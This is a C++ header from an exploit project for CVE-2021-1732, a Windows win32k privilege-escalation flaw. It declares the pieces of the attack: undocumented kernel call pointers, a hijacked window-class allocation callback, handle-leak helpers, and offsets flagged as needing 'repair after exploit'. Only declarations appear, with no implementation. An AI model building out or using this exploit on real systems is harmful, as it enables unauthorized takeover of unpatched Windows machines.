#pragma once
#include <windows.h>
#include <iostream>
#include <winternl.h>
#include <WinBase.h>
#include <ntstatus.h>
#include "include/common/memtools.hpp"
#include "include/common/gadget.hpp"

namespace CVE_2021_1732
{

    typedef NTSTATUS(WINAPI* FNtUserConsoleControl)(DWORD, ULONG_PTR, ULONG);
    typedef NTSTATUS(WINAPI* FxxxClientAllocWindowClassExtraBytes)(unsigned int* pSize);
    typedef PVOID(WINAPI* FHMValidateHandle)(HANDLE h, BYTE byType);
    typedef DWORD64(NTAPI* FNtCallbackReturn)(DWORD64* a1, DWORD64 a2, DWORD64 a3);

    inline FNtUserConsoleControl NtUserConsoleControl = nullptr;
    inline FxxxClientAllocWindowClassExtraBytes orign_xxxClientAllocWindowClassExtraBytes = nullptr;
    inline FNtCallbackReturn NtCallbackReturn = nullptr;
    inline FHMValidateHandle HMValidateHandle = nullptr;

    inline std::vector<HWND> g_HWNDs;
    inline std::vector<PVOID> g_HWNDKs;
    const size_t magicExtra = 0xDEAD;
    inline HWND choosenOne;

    //////////// offset
    inline size_t tag0_reverseBaseOffset = 0;
    inline size_t tag1_reverseBaseOffset = 0;
    inline size_t tag2_reverseBaseOffset = 0; //need repair after exploit


    bool initAPI();
    bool FindHMValidateHandle(FHMValidateHandle* pfOutHMValidateHandle);

    LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);
    NTSTATUS MyxxxClientAllocWindowClassExtraBytes(unsigned int* pSize);
} // namespace CVE_2021_1732